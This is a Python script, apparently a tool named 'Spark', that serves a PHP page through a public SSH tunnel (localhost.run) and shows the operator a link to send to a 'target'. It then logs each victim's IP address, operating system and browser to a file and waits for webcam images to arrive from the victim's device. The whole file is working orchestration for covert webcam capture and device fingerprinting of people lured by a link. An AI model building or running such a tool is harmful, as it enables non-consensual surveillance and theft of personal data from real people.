from pathlib import Path
from time import sleep
import subprocess
import linecache
import keyboard
import random
import json
import sys
import os



try:
    from colorama import Fore , init ;init()
    import pandas as pd
except (ImportError , ModuleNotFoundError):
    subprocess.call("pip install colorama pandas" , shell=True)
    sys.exit()
#Run localhost ====================================================================================================
def php_server():
    with open("Server" , "w") as log:
        subprocess.Popen((f"php -S localhost:{port}"),stderr=log,stdout=log , shell=True)
#Change localhost to Server ====================================================================================================
def loaclhost():
    global port

    with open("localhost.txt" , "w") as local:
        subprocess.Popen((f"ssh -R 80:localhost:{port} nokey@localhost.run"),stderr=local , stdout=local , shell=True)
#Run with Sudo command ====================================================================================================
if os.name == "posix":
    uid = os.getuid()
    if uid == 1000:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Run with sudo command for running the localhost {Fore.GREEN}(sudo python Spark.py)""")
else:
    pass
#type smothly ====================================================================================================
def Sprint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    sleep(0.1)

#Check php is installed ====================================================================================================

check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)

if check != 0:
    print(f"{Fore.RED}[-]{Fore.BLUE} Unfortunately you dont have PHP please install it and come back soon !")
    sys.exit()

#Clear Page ====================================================================================================
def clear():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

clear()
sleep(0.1)

#Banner ====================================================================================================
Banner_color = (Fore.RED , Fore.MAGENTA , Fore.GREEN)
rnd = random.choice(Banner_color)

print(fr"""{rnd} 
--   █████████                                █████      --
--  ███░░░░░███                              ░░███       --
-- ░███    ░░░  ████████   ██████   ████████  ░███ █████ --
-- ░░█████████ ░░███░░███ ░░░░░███ ░░███░░███ ░███░░███  --
--  ░░░░░░░░███ ░███ ░███  ███████  ░███ ░░░  ░██████░   --
--  ███    ░███ ░███ ░███ ███░░███  ░███      ░███░░███  --
-- ░░█████████  ░███████ ░░████████ █████     ████ █████ --
--  ░░░░░░░░░   ░███░░░   ░░░░░░░░ ░░░░░     ░░░░ ░░░░░  --
--              ░███                                     --
--              █████                                    --
--             ░░░░░         {Fore.BLUE}Made by : T-Onix{rnd}            --                                                       
{Fore.RESET}""")


#====================================================================================================
def webcam():
    global port
#Select port ====================================================================================================
    try:
        port = int(input(Fore.MAGENTA + f"\r\nWhich Port Want To Open {Fore.GREEN}(Default 80){Fore.BLUE} : " + Fore.RESET))
    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
    except ValueError:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
    if port > 65535:
        exit(f"""{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
#====================================================================================================
    php_server()
    
    sleep(1)

    loaclhost()

    sleep(10)

#====================================================================================================
    line = linecache.getline(r"localhost.txt" , 24)
    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
    linecache.clearcache()

    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)

#Write info ====================================================================================================
    try:
        while True:
            size = os.stat("info.json")
            if size.st_size != 0:

                
                with open("info.json", "r") as read_file:
                    data = json.load(read_file)
                    
                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"  ])
                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                    
                    sleep(1)
                    df = pd.read_json(r"info.json")
                    sleep(1)
                    df.to_csv("Victim_info.txt", index=False , mode="a")

                    victim_file= open("Victim_info.txt", "a")
                    victim_file.write("\n")
                    sleep(3)
                    open("info.json" , "w").close()
                    victim_file.close()

                    Sprint(Fore.YELLOW + "\r\nWaiting for images...".title() + Fore.RESET)
                    break

    except KeyboardInterrupt:
        exit(f"""\n{Fore.YELLOW}│
╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")

#====================================================================================================
   
    while True:
        folder = sum([f.stat().st_size for f in Path("../images").glob("**/*")])
    
        if folder != 0:
           Sprint(Fore.GREEN + "\r\n\nI got the images Check images folder".title() + Fore.RESET)
           
           try:
            
            Sprint(Fore.RED + "\r\n\npress ctrl + C for exit".title() + Fore.RESET)
            keyboard.wait("ctrl + c")
           except KeyboardInterrupt:
            pass
            
           break

    if os.name == "nt":
        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()
    else:
        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
        sys.exit()

if __name__ == "__main__":
    webcam()